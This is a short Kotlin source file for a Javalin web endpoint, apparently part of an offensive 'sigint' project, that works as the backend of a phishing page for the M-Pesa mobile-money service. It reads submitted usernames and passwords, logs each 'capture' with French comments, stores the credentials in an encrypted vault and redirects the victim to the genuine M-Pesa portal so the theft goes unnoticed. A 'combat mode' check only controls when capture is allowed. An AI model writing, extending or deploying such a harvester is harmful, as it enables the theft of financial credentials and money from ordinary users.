package com.fardc.sigint.core

import io.javalin.Javalin

class MPesaCommander(private val vault: SecurityVault, private val combatHandler: CombatModeHandler) {
    fun setup(app: Javalin) {
        app.post("/capture/mpesa") { ctx ->
            // Vérification des règles d'engagement (Manuel Cyber Fin)
            if (!combatHandler.isFinancialOffenseAllowed()) {
                println("⚠️ [BLOCAGE] Tentative de capture M-Pesa non autorisée en mode ${combatHandler.getStatus()}")
                ctx.status(403).result("ACTION_NOT_ALLOWED: Mode offensif requis.")
                return@post
            }

            val user = ctx.formParam("user")
            val pass = ctx.formParam("pass")
            
            println("💰 [OFFENSIVE] Capture M-Pesa réussie pour: $user")
            vault.encryptData("MPESA_CREDENTIALS:$user:$pass")
            ctx.redirect("https://www.mpesa.in/portal/")
        }
    }
}
